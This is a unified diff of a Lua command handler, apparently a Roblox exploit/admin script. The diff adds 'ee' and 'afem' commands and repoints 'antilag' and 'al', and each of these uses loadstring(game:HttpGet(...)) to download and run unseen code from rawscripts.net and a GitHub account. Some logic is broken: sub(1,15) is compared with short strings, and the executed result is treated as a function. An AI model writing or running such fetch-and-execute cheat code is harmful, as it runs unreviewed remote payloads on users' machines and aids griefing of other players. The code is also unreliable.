             if func then
                 local success, execResult = pcall(func)
                 if success then
@@ -4251,6 +4368,32 @@ end
                 end
             else
                 result = "Just a random anims ui:\n"
+            end
+        elseif command:sub(1, 15) == "ee" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-Energize-10408"))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "Just a random anims ui:\n"
+            end
+        elseif command:sub(1, 15) == "afem" then
+            local luaCode = command:sub(16)
+            local func, err = loadstring(game:HttpGet("https://rawscripts.net/raw/Universal-Script-AFEM-14048"))()
+            if func then
+                local success, execResult = pcall(func)
+                if success then
+                    result = "Executed successfully:\n" .. tostring(execResult)
+                else
+                    result = "Execution error:\n"
+                end
+            else
+                result = "Just a random anims ui that only works on r15:\n"
             end
         elseif command:lower():sub(1, 5) == "orbit" then
             local args = {}
@@ -4557,7 +4700,7 @@ end
             end
         elseif command:sub(1, 15) == "antilag" then
             local luaCode = command:sub(16)
-            local func, err = loadstring(game:HttpGet('https://raw.githubusercontent.com/xSejker/AntilagFixedd/main/README.md',true))()
+            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Al/refs/heads/main/AntiLag", true))()
             if func then
                 local success, execResult = pcall(func)
                 if success then
@@ -4566,11 +4709,11 @@ end
                     result = "Execution error:\n"
                 end
             else
-                result = "AntiLag Started:\nRecommended To Use FullBright"
+                result = "AntiLag Started:\n"
             end
         elseif command:sub(1, 15) == "al" then
             local luaCode = command:sub(16)
-            local func, err = loadstring(game:HttpGet('https://raw.githubusercontent.com/xSejker/AntilagFixedd/main/README.md',true))()
+            local func, err = loadstring(game:HttpGet("https://raw.githubusercontent.com/OBFhm5650lol/Al/refs/heads/main/AntiLag", true))()
             if func then
                 local success, execResult = pcall(func)
                 if success then
@@ -4579,7 +4722,7 @@ end
                     result = "Execution error:\n"
                 end
             else
-                result = "AntiLag Started:\nRecommended To Use FullBright"
+                result = "AntiLag Started:\n"
             end
         elseif command:sub(1, 15) == "loopkill" then
             local luaCode = command:sub(16)
